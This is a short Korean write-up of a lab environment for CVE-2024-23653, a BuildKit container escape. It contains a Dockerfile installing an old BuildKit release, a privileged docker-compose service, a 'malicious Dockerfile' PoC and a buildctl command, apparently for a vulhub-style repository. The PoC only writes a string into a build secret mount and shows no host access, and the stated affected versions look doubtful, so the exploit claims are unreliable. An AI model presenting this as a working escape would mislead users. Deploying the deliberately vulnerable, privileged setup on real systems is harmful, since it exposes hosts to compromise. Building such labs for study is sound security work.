CVE-2024-23653 - BuildKit 컨테이너 탈출 취약점

1. 개요
- 취약점 번호: CVE-2024-23653
- 취약점명: BuildKit Container Escape
- 영향 버전: BuildKit v0.11.6 이하
- 공개일자: 2024년 초
- 취약점 유형: 컨테이너 격리 우회 (Privilege Escalation)

BuildKit을 privileged 모드로 실행할 경우, 빌드 과정에서 호스트 파일 시스템에 접근할 수 있는 문제가 발생한다.

2. 환경 구성

2-1. Dockerfile

```Dockerfile
FROM ubuntu:20.04

RUN apt-get update && apt-get install -y \
    curl \
    build-essential \
    && rm -rf /var/lib/apt/lists/*

RUN curl -LO https://github.com/moby/buildkit/releases/download/v0.11.5/buildkit-v0.11.5.linux-amd64.tar.gz && \
    tar -xvzf buildkit-v0.11.5.linux-amd64.tar.gz && \
    mv bin/buildkitd /usr/local/bin/buildkitd && \
    mv bin/buildctl /usr/local/bin/buildctl

CMD ["buildkitd"]
```

2-2. docker-compose.yaml

```yaml
version: '3'

services:
  buildkit:
    build: .
    container_name: buildkit_cve
    privileged: true
    tty: true
```

3. PoC

3-1. 악성 Dockerfile 예시

```Dockerfile
FROM busybox

RUN --mount=type=secret,id=mysecret echo "Hacked by BuildKit" > /run/secrets/mysecret
```

3-2. 빌드 명령어

```bash
buildctl build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --import-cache type=registry,ref=myregistry.local:5000/cache \
  --output type=local,dest=/tmp/output
```

3-3. 성공 결과

/run/secrets/mysecret 파일을 읽어보면 다음과 같은 문자열이 존재한다:

```
Hacked by BuildKit
```

4. 추가 수행

- Fork 및 커밋 완료
- Pull Request 제출 예정
- vulhub.org에 없는 신규 CVE 환경 구성 완료

5. 참고 링크

- Fork한 레포지터리 링크: https://github.com/jeonminju2/kr-vulhub
- (Pull Request 후 PR 링크 추가 예정)
